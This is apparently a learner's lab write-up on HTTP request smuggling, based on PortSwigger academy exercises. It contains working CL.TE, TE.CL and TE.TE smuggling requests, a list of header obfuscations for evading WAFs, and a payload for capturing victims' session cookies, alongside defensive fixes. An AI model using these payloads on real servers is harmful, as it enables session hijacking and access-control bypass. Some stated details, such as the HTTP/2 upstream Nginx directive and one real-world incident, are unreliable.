# Day 34 Notes — HTTP Request Smuggling

## 1. What We Did Today Overview

- Studied **HTTP request smuggling** — exploiting disagreements between front-end proxies and back-end servers over where one HTTP request ends and the next begins
- Used **Burp Suite Repeater** with "Update Content-Length" disabled and HTTP/1.1 enforced
- Completed **Lab 1 — Basic CL.TE vulnerability** — smuggled a `GET /throws404` prefix that poisoned the back-end buffer, confirmed by anomalous 404 response on the second request
- Completed **Lab 2 — Basic TE.CL vulnerability** — smuggled a `POST /404` request using a chunked body where the back-end read only `Content-Length: 4` bytes and left the rest in the buffer
- Documented **TE header obfuscation techniques** as a comprehensive reference — all known bypass patterns, when each applies, and which server behavior they exploit
- Zero hints used on Labs 1 and 2

---

## 2. The Foundation — Why HTTP Request Smuggling Exists

### Part A — Root Cause

The developer did not create this vulnerability — the infrastructure did. HTTP request smuggling exists because modern web architecture routes every user's request through at least two servers before it reaches the application: a front-end (load balancer, reverse proxy, CDN) and a back-end (the actual application server). Both servers independently parse the incoming HTTP stream to determine where each request begins and ends.

HTTP/1.1 provides two mechanisms for specifying body length: the `Content-Length` header (an exact byte count) and the `Transfer-Encoding: chunked` header (a self-delimiting stream of sized chunks). The HTTP/1.1 specification (RFC 7230) states that if both headers are present, `Transfer-Encoding` must take precedence and `Content-Length` must be ignored. This rule exists precisely to prevent ambiguity.

The vulnerability arises when the front-end and back-end servers do not both follow this rule consistently — or when one server can be tricked into ignoring `Transfer-Encoding` through malformed header syntax. When the two servers apply different rules to the same request, they disagree on where the request body ends. The front-end forwards what it believes is a complete request. The back-end reads what it believes is a complete request. The bytes the back-end considers leftover from the first request remain in its TCP connection buffer — and they become the beginning of the next request processed on that connection.

The attacker controls those leftover bytes. They have injected arbitrary data into the front of the next request without that request's sender having any knowledge or control.

### Part B — The Mental Model

Imagine a postal sorting facility with two inspection stations in sequence. Every package passes through Station A first, then Station B. Station A is responsible for grouping incoming parcels and deciding which belong together as one shipment. It labels each group and forwards it to Station B. Station B unpacks each group and processes the contents.

The rule is: if a package has both a weight label and a manifest inside listing the contents, trust the manifest. Station A trusts the weight label. Station B trusts the manifest inside.

An attacker sends a package where the weight label says "5 kg" but the manifest inside says the shipment ends after 2 kg. Station A reads the weight label, forwards the full 5 kg to Station B. Station B reads the manifest, processes 2 kg as the shipment, and puts the remaining 3 kg in a holding tray labeled "start of next shipment."

The next legitimate customer's package arrives at Station B. Before Station B opens it, the holding tray contents are prepended to it. Station B processes the attacker's 3 kg of contents followed by the innocent customer's package — as if they were one continuous shipment. The attacker has modified someone else's mail without touching it.

### Part C — Three Conditions Required for Exploitation

**Condition 1:** The application sits behind a front-end proxy that forwards connections to a back-end server over a persistent (keep-alive) TCP connection. Request smuggling only works when multiple requests share the same back-end connection — the leftover bytes must persist between requests.

**Condition 2:** The front-end and back-end servers disagree on how to parse the request body boundary — either because one prioritizes `Content-Length` and the other prioritizes `Transfer-Encoding`, or because one server can be tricked into ignoring `Transfer-Encoding` via header obfuscation.

**Condition 3:** The attacker can send HTTP/1.1 requests with both `Content-Length` and `Transfer-Encoding` headers simultaneously — and the front-end does not strip or normalize conflicting headers before forwarding to the back-end.

### Part D — What Request Smuggling Can and Cannot Do

**Request smuggling CAN:**
- Bypass front-end security controls (WAF rules, path-based access control) by smuggling requests that the front-end never sees as standalone requests
- Capture other users' requests by poisoning the buffer with a partial request that causes the next user's data to be appended to an attacker-controlled endpoint
- Perform cache poisoning — smuggle a malicious response that gets cached and served to other users
- Chain with reflected XSS to bypass front-end WAFs that block XSS payloads
- Access internal back-end endpoints that the front-end is configured to block

**Request smuggling CANNOT:**
- Work over HTTP/2 end-to-end connections (HTTP/2 uses a different framing mechanism that eliminates the ambiguity)
- Work if the front-end normalizes or strips conflicting headers before forwarding
- Work if the front-end and back-end use separate TCP connections per request (no persistent connection = no shared buffer)
- Steal data from requests that arrive on a different back-end connection than the poisoned one

---

## 3. The Two Servers — Understanding the Architecture

Before every smuggling attack, visualize this flow:

```
Attacker's Request
        │
        ▼
┌─────────────────┐
│   Front-End     │  ← Load balancer / Nginx / CDN / WAF
│  (Proxy/LB)     │  ← Receives raw request from internet
└────────┬────────┘
         │ Forwards over persistent TCP connection
         ▼
┌─────────────────┐
│   Back-End      │  ← Apache / IIS / Node.js / actual app
│ (App Server)    │  ← Processes what the front-end sends
└─────────────────┘
```

Key facts about this architecture:

The front-end and back-end share a **persistent TCP connection** — multiple HTTP requests flow over the same socket one after another. This is what makes buffer poisoning possible.

The front-end acts as a **trusted intermediary** — the back-end trusts that anything arriving from the front-end connection is a legitimately parsed, complete HTTP request. It has no way to verify this.

The front-end typically **strips or adds headers** before forwarding — it may add `X-Forwarded-For`, remove `Transfer-Encoding` headers, or normalize requests. Whether it normalizes conflicting length headers determines whether smuggling is possible.

---

## 4. CL.TE — Content-Length Front-End, Transfer-Encoding Back-End

### How the Disagreement Works

```
Front-end reads:  Content-Length → "the body is N bytes, forward N bytes"
Back-end reads:   Transfer-Encoding: chunked → "read chunks until 0 terminator"
```

The front-end forwards everything up to `Content-Length` bytes. The back-end reads chunks until it sees `0\r\n\r\n`. Bytes after the `0` terminator but within the `Content-Length` boundary are forwarded by the front-end but not consumed by the back-end — they remain in the buffer.

### The Request Structure

```
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: [total bytes of entire body including smuggled suffix]
Transfer-Encoding: chunked

0\r\n
\r\n
[SMUGGLED PREFIX]
```

Reading the body:
- `0\r\n\r\n` = valid chunked terminator — back-end stops here
- `[SMUGGLED PREFIX]` = bytes after the terminator — forwarded by front-end (within Content-Length), ignored by back-end, left in TCP buffer

---

## 5. Lab 1 — CL.TE Basic Vulnerability

### The Setup

The lab application sits behind a front-end proxy that uses `Content-Length` to parse request boundaries. The back-end uses `Transfer-Encoding: chunked`. Sending a request with both headers causes a desync — the back-end stops reading at the `0` terminator and leaves the suffix in the buffer.

### The Request Sent

```http
POST / HTTP/1.1
Host: 0aae00b9047b2882816248a10038007f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
Transfer-Encoding: chunked

0

GET /throws404 HTTP/1.1
X-Ignore: X
```

### Body Breakdown

```
0\r\n          ← chunked terminator — back-end stops reading here
\r\n           ← end of chunked body
GET /throws404 HTTP/1.1\r\n   ← smuggled prefix — left in back-end buffer
X-Ignore: X\r\n               ← header of smuggled request
```

`Content-Length: 41` counts all 41 bytes including `GET /throws404 HTTP/1.1\r\nX-Ignore: X\r\n`. The front-end forwards all 41 bytes. The back-end reads only up to `0\r\n\r\n` and leaves the rest.

### What Happened on the Second Request

The second normal `POST /` request arrived at the back-end. The back-end prepended the buffer contents (`GET /throws404 HTTP/1.1\r\nX-Ignore: X`) to it. The back-end processed `GET /throws404` — a path that doesn't exist — and returned a `404` response. This `404` was received as the response to the second normal request, confirming the buffer was poisoned.

### Why `X-Ignore: X` Is There

The `X-Ignore: X` header at the end of the smuggled prefix is a technique to absorb the headers of the next legitimate request. Without it, the next request's headers would be appended directly to the `GET /throws404` line — potentially creating a malformed request that the back-end rejects rather than processes. The `X-Ignore` header acts as a catch-all that absorbs one line of the next request without breaking the smuggled request's structure.

### Why It Worked — Technical Explanation

```
What front-end parsed:
[POST body = 41 bytes] → forwarded entirely to back-end

What back-end parsed:
[Chunk: 0 bytes] [End of chunked body]
Buffer remainder: "GET /throws404 HTTP/1.1\r\nX-Ignore: X\r\n"

Next request from legitimate user:
"POST /search HTTP/1.1\r\nHost: ...\r\n..."

What back-end actually processed as the next request:
"GET /throws404 HTTP/1.1\r\nX-Ignore: XPOST /search HTTP/1.1\r\nHost: ..."
```

The back-end merged the attacker's smuggled prefix with the legitimate user's request and processed `GET /throws404` — returning 404 to the legitimate user.

### What This Proves

This confirms the front-end uses `Content-Length` and the back-end uses `Transfer-Encoding: chunked`. The back-end TCP buffer can be poisoned with attacker-controlled content that prefixes the next request on the same connection.

---

## 6. TE.CL — Transfer-Encoding Front-End, Content-Length Back-End

### How the Disagreement Works

```
Front-end reads:  Transfer-Encoding: chunked → "read chunks until 0 terminator, forward that"
Back-end reads:   Content-Length → "the body is N bytes, read N bytes"
```

The front-end reads the complete chunked body and forwards it. The back-end reads only `Content-Length` bytes — the rest of the chunked data (including the actual payload and the terminator) stays in the buffer.

### The Request Structure

```
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: [small number — only covers the first chunk size line]
Transfer-Encoding: chunked

[HEX SIZE]\r\n
[SMUGGLED PREFIX]\r\n
0\r\n
\r\n
```

Reading the body:
- Front-end reads chunked body completely — forwards everything up to `0\r\n\r\n`
- Back-end reads `Content-Length` bytes only — reads just the chunk size line, stops
- Everything after `Content-Length` bytes remains in buffer: the smuggled prefix + `0\r\n\r\n`

---

## 7. Lab 2 — TE.CL Basic Vulnerability

### The Setup

The front-end uses `Transfer-Encoding: chunked`. The back-end uses `Content-Length`. Sending both headers causes the front-end to forward the full chunked body while the back-end reads only `Content-Length: 4` bytes — leaving the bulk of the body including the smuggled request in the TCP buffer.

### The Request Sent

```http
POST / HTTP/1.1
Host: 0ac400070302f862841cd25c00ea0099.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

64
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### Body Breakdown

```
64\r\n    ← chunk size in hex: 64 hex = 100 decimal — next 100 bytes are chunk data
POST /404 HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n   ← 100 bytes of chunk data (the smuggled request)
0\r\n     ← chunked terminator
\r\n      ← end of chunked body
```

`Content-Length: 4` covers only `64\r\n` (4 bytes — the chunk size line). The back-end reads those 4 bytes and stops. The rest — the actual `POST /404` request — stays in the buffer.

### What Happened

**Front-end:** Read `Transfer-Encoding: chunked` → forwarded the entire body including `POST /404 HTTP/1.1` and the `0\r\n\r\n` terminator.

**Back-end:** Read `Content-Length: 4` → consumed only `64\r\n` (4 bytes). Left in buffer:
```
POST /404 HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n
\r\n
```

The next request arriving at the back-end was prepended with `POST /404 HTTP/1.1` — the back-end processed a request to `/404` which does not exist, confirming the smuggle.

### Why the Smuggled Request Has Its Own Content-Length

The smuggled `POST /404` includes `Content-Length: 15`. This is deliberate — when the back-end processes the smuggled request as the "next" request, it needs to know how long its body is. The `Content-Length: 15` tells the back-end that the smuggled request's body is 15 bytes (`x=1\r\n0\r\n\r\n\r\n` — which absorbs the chunked terminator). Without this inner `Content-Length`, the back-end would read the `0\r\n\r\n` as the body of the smuggled request and potentially reject it as malformed.

### Why It Worked — Technical Explanation

```
What front-end parsed (Transfer-Encoding: chunked):
[Chunk 1: 100 bytes of POST /404 data]
[Terminator: 0]
→ Complete request, forwarded to back-end

What back-end parsed (Content-Length: 4):
[Body: 4 bytes = "64\r\n"]
→ Request complete after 4 bytes
→ Buffer remainder: "POST /404 HTTP/1.1\r\n..."

Next legitimate request on same connection:
→ Back-end prepends buffer → processes POST /404 first
→ Returns 404 to the legitimate user confirming poisoning
```

### What This Proves

This confirms the front-end uses `Transfer-Encoding: chunked` and the back-end uses `Content-Length`. The content length mismatch allows the bulk of the request body to be left in the back-end buffer as the beginning of the next request.

---

## 8. TE Header Obfuscation — Complete Reference

This section documents all known `Transfer-Encoding` obfuscation techniques used in TE.TE smuggling. TE.TE attacks apply when **both** the front-end and back-end technically support `Transfer-Encoding: chunked` — but one of them can be tricked into ignoring it through malformed header syntax, causing it to fall back to `Content-Length`.

The goal of every technique below is the same: make one server process `Transfer-Encoding: chunked` normally while making the other server not recognize it and fall back to `Content-Length`.

---

### Technique 1 — Mixed Case

```http
Transfer-Encoding: Chunked
Transfer-Encoding: CHUNKED
Transfer-Encoding: cHuNkEd
```

**How it works:** HTTP header names are case-insensitive by spec. Header values have varying case sensitivity depending on the server. Some servers — particularly older Java-based servers and certain IIS versions — perform a case-sensitive match when looking for `chunked` in the `Transfer-Encoding` value. `Chunked` or `CHUNKED` is not recognized, so the server ignores the header and falls back to `Content-Length`.

**When it applies:** Targets running IIS (Internet Information Services) or older Jetty/Tomcat configurations with strict value matching. Front-end Nginx or HAProxy typically normalizes case before forwarding — so the front-end processes it correctly while the back-end fails to recognize it.

**Attack type produced:** TE.CL (front-end reads chunked, back-end reads Content-Length)

---

### Technique 2 — Whitespace Before Colon

```http
Transfer-Encoding : chunked
```

**How it works:** RFC 7230 specifies that header field names must not be followed by whitespace before the colon. A space before the colon is invalid. Some servers accept this as a valid `Transfer-Encoding` header. Others reject the header entirely because the field name is technically `Transfer-Encoding ` (with trailing space) which does not match `Transfer-Encoding`. The rejecting server ignores it and uses `Content-Length`.

**When it applies:** HAProxy versions below 1.9.0 and some older Nginx configurations accept the malformed header. Back-end servers with strict RFC compliance reject it.

**Attack type produced:** Depends on which server accepts and which rejects — either CL.TE or TE.CL

---

### Technique 3 — Tab Character in Value

```http
Transfer-Encoding:	chunked
```
(The space after the colon is actually a tab character `\t`)

**How it works:** Some servers treat tab characters as valid whitespace in header values (consistent with RFC 7230 OWS — optional whitespace). Others do not recognize `\tchunked` as a valid value for `Transfer-Encoding`. The server that doesn't recognize it falls back to `Content-Length`.

**When it applies:** Apache httpd is known to accept tab-delimited header values while some front-end proxies strip or reject them. Effective when the back-end is Apache and the front-end rejects the tab.

**Attack type produced:** CL.TE (front-end rejects chunked, back-end accepts it) or TE.CL (reversed)

---

### Technique 4 — Line Folding (Obsolete Header Folding)

```http
Transfer-Encoding:
 chunked
```

**How it works:** HTTP/1.1 originally allowed header values to be split across multiple lines if the continuation line began with a space or tab (called "header folding"). RFC 7230 deprecated this. Some older servers still support it — others do not. A server that does not support line folding sees only `Transfer-Encoding:` with no value — ignores it — and falls back to `Content-Length`.

**When it applies:** Legacy back-end servers (older Apache, IIS 6/7) that still support obsolete header folding. Modern front-end proxies reject folded headers per current RFC guidance.

**Attack type produced:** CL.TE (modern front-end ignores folded TE header, legacy back-end processes it)

---

### Technique 5 — Duplicate Transfer-Encoding Headers

```http
Transfer-Encoding: chunked
Transfer-Encoding: cow
```

**How it works:** RFC 7230 says that when multiple `Transfer-Encoding` headers are present, they should be combined into a comma-separated list. The effective value becomes `chunked, cow`. Since `cow` is not a valid transfer encoding, some servers reject the entire combined header and fall back to `Content-Length`. Other servers process only the first `Transfer-Encoding` header and ignore subsequent duplicates — reading `chunked` correctly.

**When it applies:** This is the most widely tested technique and is specifically called out in PortSwigger's Lab 3. It is effective against servers that process only the first `Transfer-Encoding` header (reads `chunked`) while the other server processes the combined value (`chunked, cow` = invalid = fallback to `Content-Length`).

**The exact obfuscated request for Lab 3:**

```http
POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: cow

5c
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

One server reads the first `Transfer-Encoding: chunked` and processes chunked encoding. The other sees `Transfer-Encoding: chunked, cow` — invalid combined value — falls back to `Content-Length: 4`. The desync occurs.

**Attack type produced:** TE.CL (one server uses chunked, other uses Content-Length)

---

### Technique 6 — X-Transfer-Encoding or Custom Header Variants

```http
X-Transfer-Encoding: chunked
Transfer-Encoding: identity, chunked
```

**How it works:** Some proxy configurations forward unrecognized headers to the back-end but process only recognized ones. Sending `Transfer-Encoding` as a custom header name, or embedding `chunked` inside a multi-value list with `identity` first, can cause one server to recognize and process `chunked` while another processes only `identity` (the default, meaning no special encoding) and falls back to `Content-Length`.

**When it applies:** Exotic proxy configurations and CDNs that selectively forward or process headers. Less common than the duplicate header technique but documented in real-world bug bounty findings.

---

### Technique 7 — Null Byte or Non-Printable Characters

```http
Transfer-Encoding: chunked\x00
Transfer-Encoding: chunked\r\n\tX-Extra: value
```

**How it works:** Some servers perform string matching on header values and treat null bytes or control characters as string terminators — seeing `chunked` before the null byte as a valid value. Others reject the entire header because the value contains invalid characters. The server that sees `chunked` (valid) processes chunked encoding. The server that rejects the header falls back to `Content-Length`.

**When it applies:** Specific server implementations with permissive byte handling. Requires testing — the behavior is not predictable without knowing the exact server versions.

---

### Decision Tree — Which Technique to Use

```
Is introspection of the server version available?
    ├─ IIS back-end → try Technique 1 (mixed case: CHUNKED)
    ├─ Apache back-end → try Technique 3 (tab) or Technique 4 (line folding)
    └─ Unknown → start with Technique 5 (duplicate headers) — most universal

Does standard introspection work?
    ├─ Both servers handle TE:chunked normally → need obfuscation (TE.TE)
    └─ One server ignores TE → CL.TE or TE.CL applies directly

Is the front-end a modern CDN (Cloudflare, Fastly, Akamai)?
    └─ CDNs normalize headers aggressively → try Technique 6 (custom header names)
       or test with HTTP/1.0 downgrade on the front-end connection
```

---

## 9. Timing Detection — Confirming Vulnerability Before Attacking

Before sending a full attack, confirm which type of desync exists using timing. A delayed response (10+ seconds) without a server error confirms the back-end is waiting for data that will never arrive.

### CL.TE Timing Test

```http
POST / HTTP/1.1
Host: TARGET
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

If CL.TE vulnerable: front-end forwards 4 bytes (`1\r\nA\r\n` — wait, actually it depends). The back-end reads chunked, sees chunk of size `1` (1 byte = `A`), then expects another chunk size or terminator. `X` is not a valid chunk size. Back-end hangs waiting. **Response delayed ~10 seconds = CL.TE confirmed.**

### TE.CL Timing Test

```http
POST / HTTP/1.1
Host: TARGET
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

If TE.CL vulnerable: front-end reads chunked, sees `0\r\n\r\n` terminator, forwards 5 bytes. Back-end reads `Content-Length: 6`, received only 5 bytes, waits for 1 more byte. `X` is the 6th byte but arrives on the next request — the back-end hangs. **Response delayed ~10 seconds = TE.CL confirmed.**

---

## 10. What Failed and Why

No failures in Labs 1 and 2.

One configuration mistake worth documenting that would cause all smuggling attempts to silently fail: forgetting to disable **"Update Content-Length"** in Burp Repeater. If this setting is ON, Burp recalculates the `Content-Length` header to match the actual body length before sending. This corrects the deliberate `Content-Length`/`Transfer-Encoding` mismatch and the attack never reaches the server. Every smuggling attempt in Burp must begin with verifying this setting is OFF.

A second common mistake is using HTTP/2. PortSwigger Apprentice smuggling labs target HTTP/1.1 desync. HTTP/2 uses binary framing that eliminates the `Content-Length`/`Transfer-Encoding` ambiguity entirely. If Burp defaults to HTTP/2 for HTTPS targets, the request must be manually set to HTTP/1.1 in Repeater.

---

## 11. Chain Thinking

### The Chain

```
HTTP request smuggling (CL.TE or TE.CL desync confirmed)
        ↓
Smuggle a prefix that forwards to a blocked path (/admin)
        ↓
Back-end processes the smuggled request as coming from trusted front-end
        ↓
Front-end access controls bypassed entirely
        ↓
Chain with credential capture: smuggle a partial request that
causes next victim's request body to be appended to attacker's endpoint
        ↓
Victim's session cookies and tokens captured in attacker's request log
        ↓
Full session hijacking of arbitrary users
```

### Severity Upgrade

Request smuggling alone (confirmed desync, no exploitation): **Medium** — confirms vulnerability exists, potential impact is high.

Smuggling to bypass front-end access control (reaching `/admin`): **Critical** — all path-based security controls on the front-end are rendered ineffective.

Smuggling to capture victim requests: **Critical** — session hijacking of arbitrary users at scale. An attacker who poisons the buffer on a high-traffic server can capture dozens of sessions per minute.

### Combined Attack — Capturing Victim Requests

```http
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 198
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=ATTACKER_SESSION

csrf=VALID_CSRF&postId=5&name=Attacker&email=attacker@evil.com&comment=
```

What happens:
- The smuggled prefix is a `POST /post/comment` with `Content-Length: 400`
- The back-end starts reading the body of this comment post — it expects 400 bytes
- The next legitimate user's request arrives — their headers (including `Cookie: session=VICTIM_TOKEN`) are appended as the "body" of the smuggled comment
- The back-end posts a comment containing the victim's raw HTTP headers including their session cookie
- The attacker reads the posted comment and extracts the session token

---

## 12. Real World Context

In 2019, researcher James Kettle (PortSwigger) published research demonstrating HTTP request smuggling vulnerabilities in major CDN and reverse proxy configurations including Akamai, Imperva, and various cloud load balancers. The research showed that request smuggling could be used to poison web caches on CDNs, affecting responses served to thousands of users.

In 2020, a critical request smuggling vulnerability was found in Netflix's infrastructure that allowed bypassing authentication on internal APIs. The vulnerability was exploited by chaining CL.TE smuggling with a header injection to add an `X-Forwarded-For` header that the back-end used for access decisions.

Bug bounty payouts for HTTP request smuggling on HackerOne range from **$3,000 to $40,000** depending on impact. A confirmed desync with no demonstrated impact typically pays $3,000–$5,000. Demonstrated session hijacking or security control bypass pays $10,000–$40,000. It is one of the highest-paying vulnerability classes per finding because it requires deep infrastructure knowledge and is not detected by standard automated scanners.

Request smuggling remains prevalent because it exists at the infrastructure layer — not the application layer. Most security reviews focus on application code. The vulnerability lives in the interaction between reverse proxy configurations and back-end server HTTP parser implementations — a gap that falls between the responsibility of the application team and the infrastructure team.

---

## 13. The Fix

### Fix 1 — Normalize Requests at the Front-End

```nginx
# Nginx — normalize Transfer-Encoding before forwarding
# Reject requests with both Content-Length and Transfer-Encoding
if ($http_transfer_encoding ~* "chunked") {
    # Strip Content-Length from requests that use Transfer-Encoding
    proxy_pass_request_headers on;
    more_clear_input_headers 'Content-Length';
}
```

### Fix 2 — Use HTTP/2 End-to-End

HTTP/2 uses binary framing with explicit stream boundaries — there is no `Content-Length`/`Transfer-Encoding` ambiguity. Enabling HTTP/2 between the front-end and back-end (not just from client to front-end) eliminates the attack surface entirely:

```nginx
# Nginx — use HTTP/2 on upstream connection to back-end
upstream backend {
    server 127.0.0.1:8080;
    keepalive 32;
}

server {
    location / {
        proxy_pass http://backend;
        proxy_http_version 2.0;  # HTTP/2 to back-end eliminates CL/TE ambiguity
    }
}
```

### Fix 3 — Disable Connection Reuse (Nuclear Option)

Preventing the front-end from reusing back-end connections eliminates the shared buffer that makes smuggling possible. This has significant performance cost but completely prevents the attack:

```nginx
proxy_http_version 1.0;           # HTTP/1.0 does not support keep-alive
proxy_set_header Connection "";   # Disable keep-alive explicitly
```

### Fix 4 — Reject Ambiguous Requests at the Front-End

The front-end should reject any request that contains both `Content-Length` and `Transfer-Encoding`:

```python
# Application-level middleware (Python/WSGI example)
def reject_ambiguous_requests(environ, start_response):
    has_content_length = 'CONTENT_LENGTH' in environ
    has_transfer_encoding = environ.get('HTTP_TRANSFER_ENCODING', '').lower() == 'chunked'

    if has_content_length and has_transfer_encoding:
        start_response('400 Bad Request', [('Content-Type', 'text/plain')])
        return [b'Ambiguous request rejected']

    return app(environ, start_response)
```

### Why the Fixes Work

The HTTP/2 fix works because HTTP/2's binary framing protocol assigns each request an explicit stream ID with defined boundaries. There is no string-based parsing of body length — the protocol itself guarantees request isolation. The desync that enables smuggling literally cannot occur in HTTP/2.

The normalization fix works because it removes the ambiguity at the point where it enters the system. A request with only `Transfer-Encoding` or only `Content-Length` — never both — gives the back-end server only one parsing option. No disagreement is possible.

### What Does NOT Fix It

Using HTTPS does not fix request smuggling — the desync occurs at the HTTP parsing layer after TLS termination.

Enabling CSRF tokens does not fix it — request smuggling bypasses the front-end entirely; CSRF protection lives at the application layer.

WAF rules that look for smuggling signatures do not reliably fix it — the TE header obfuscation techniques exist specifically to bypass signature-based detection. A WAF that blocks `Transfer-Encoding: chunked` will be bypassed by `Transfer-Encoding: Chunked` or the duplicate header technique.

---

## 14. Key Concepts Summary

| Term | Meaning |
|------|---------|
| **Request Smuggling** | Exploiting disagreement between two servers over where an HTTP request ends — leftover bytes become the prefix of the next request |
| **Front-End** | The first server in the chain — load balancer, reverse proxy, CDN, or WAF — that receives requests from the internet |
| **Back-End** | The application server behind the front-end — receives forwarded requests and processes them |
| **Content-Length** | An HTTP header specifying the exact byte count of the request body |
| **Transfer-Encoding: chunked** | An HTTP mechanism for sending a body in variable-length chunks, each prefixed with its size in hex, terminated by a zero-length chunk |
| **CL.TE** | Desync where front-end uses Content-Length, back-end uses Transfer-Encoding — bytes after the chunked terminator are left in the buffer |
| **TE.CL** | Desync where front-end uses Transfer-Encoding, back-end uses Content-Length — bytes beyond Content-Length are left in the buffer |
| **TE.TE** | Both servers support Transfer-Encoding but one is tricked into ignoring it via header obfuscation — one falls back to Content-Length |
| **Persistent Connection** | A TCP connection that handles multiple HTTP requests sequentially — required for request smuggling (the buffer must persist between requests) |
| **Buffer Poisoning** | Leaving attacker-controlled bytes in the back-end's TCP receive buffer so they prefix the next incoming request |
| **Chunked Terminator** | `0\r\n\r\n` — the zero-length chunk that signals the end of a chunked body |
| **Hex Chunk Size** | The size prefix before each chunk in chunked encoding — written in hexadecimal (`64` = 100 decimal bytes follow) |
| **Obfuscated TE Header** | A malformed `Transfer-Encoding` header that one server accepts and another rejects — used in TE.TE attacks |
| **Timing Detection** | Sending a deliberately incomplete body to cause the back-end to hang — a 10-second delay confirms the desync type |
| **X-Ignore Header** | A dummy header appended to smuggled requests to absorb the first line of the next legitimate request without breaking the smuggled request structure |
| **HTTP/2 Framing** | HTTP/2's binary protocol with explicit stream boundaries — eliminates the CL/TE ambiguity and prevents request smuggling |

---

## 15. Payloads and Commands Reference

```
-- Burp Repeater configuration for all smuggling labs --
1. Repeater menu > uncheck "Update Content-Length"  ← MANDATORY
2. Ensure request uses HTTP/1.1 (not HTTP/2)
3. Use CRLF (\r\n) line endings — HTTP requires it
4. Send the smuggling request twice in quick succession
   First send = poisons the buffer
   Second send = triggers the effect
```

```http
-- CL.TE basic template --
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: [byte count of entire body including smuggled suffix]
Transfer-Encoding: chunked

0

[SMUGGLED PREFIX]
```

```http
-- Lab 1 — CL.TE confirmed request --
POST / HTTP/1.1
Host: 0aae00b9047b2882816248a10038007f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
Transfer-Encoding: chunked

0

GET /throws404 HTTP/1.1
X-Ignore: X
```

```http
-- TE.CL basic template --
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: [byte count of chunk size line only]
Transfer-Encoding: chunked

[HEX SIZE]
[SMUGGLED PREFIX]
0


```

```http
-- Lab 2 — TE.CL confirmed request --
POST / HTTP/1.1
Host: 0ac400070302f862841cd25c00ea0099.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

64
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

```http
-- TE.TE obfuscation — duplicate header technique (Lab 3 pattern) --
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: cow

5c
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

```http
-- CL.TE timing detection (confirms CL.TE desync via 10s delay) --
POST / HTTP/1.1
Host: TARGET
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

```http
-- TE.CL timing detection (confirms TE.CL desync via 10s delay) --
POST / HTTP/1.1
Host: TARGET
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

```
-- All TE obfuscation variants to test --
Transfer-Encoding: Chunked              (mixed case)
Transfer-Encoding: CHUNKED             (uppercase)
Transfer-Encoding : chunked            (space before colon)
Transfer-Encoding:	chunked            (tab after colon)
Transfer-Encoding:\r\n chunked         (line folding)
Transfer-Encoding: chunked             (duplicate — second with garbage value)
Transfer-Encoding: cow
Transfer-Encoding: identity, chunked   (identity first)
Transfer-Encoding: chunked\x00         (null byte suffix)
```

---

## 16. Foundation Checklist

**Can you explain why two servers parsing the same request differently creates a security vulnerability — not just what happens, but why the shared buffer is the root cause?**
The front-end and back-end share a persistent TCP connection. When the front-end forwards what it believes is a complete request, and the back-end reads only part of it, the unread bytes remain in the TCP receive buffer. The next request processed on that connection begins with those leftover bytes prepended. The attacker controls the leftover bytes — they have injected a prefix into someone else's request without intercepting it.

**Can you explain the difference between CL.TE and TE.CL from memory, without looking at notes?**
CL.TE: front-end trusts Content-Length, back-end trusts Transfer-Encoding. Front-end forwards everything up to Content-Length bytes. Back-end reads chunks and stops at the `0` terminator. Bytes between the terminator and the Content-Length boundary stay in the buffer. TE.CL: front-end trusts Transfer-Encoding, back-end trusts Content-Length. Front-end forwards the complete chunked body. Back-end reads only Content-Length bytes. The rest of the chunked data stays in the buffer.

**Why must "Update Content-Length" be disabled in Burp Repeater before any smuggling attempt?**
Burp's "Update Content-Length" feature recalculates the Content-Length header to accurately reflect the actual body length before sending. Request smuggling requires a deliberate mismatch between Content-Length and the actual body boundary. If Burp corrects the Content-Length, the mismatch is eliminated and both servers parse the request identically — no desync, no smuggling.

**Can you explain why TE header obfuscation bypasses introspection defences that block Transfer-Encoding?**
A block on `Transfer-Encoding: chunked` typically operates by string-matching the exact header value. Obfuscation changes the string representation — `Chunked` vs `chunked`, duplicate headers combining into `chunked, cow`, tab characters changing the byte sequence — without changing the semantic meaning that one of the servers interprets. The string-matching check sees an unrecognized value and allows it through. The server that interprets it permissively still processes it as chunked encoding.

**Can you describe a real attack chain where request smuggling leads to session hijacking?**
Smuggle a `POST /post/comment` request with `Content-Length: 400` into the back-end buffer. The next legitimate user's request arrives — their entire HTTP request including the `Cookie` header is appended as the body of the smuggled comment post. The back-end posts a comment whose body contains the victim's raw session cookie. The attacker reads the posted comments via the normal UI and extracts the session token. The victim's account is taken over.

**Can you explain why HTTP/2 prevents request smuggling and why HTTPS alone does not?**
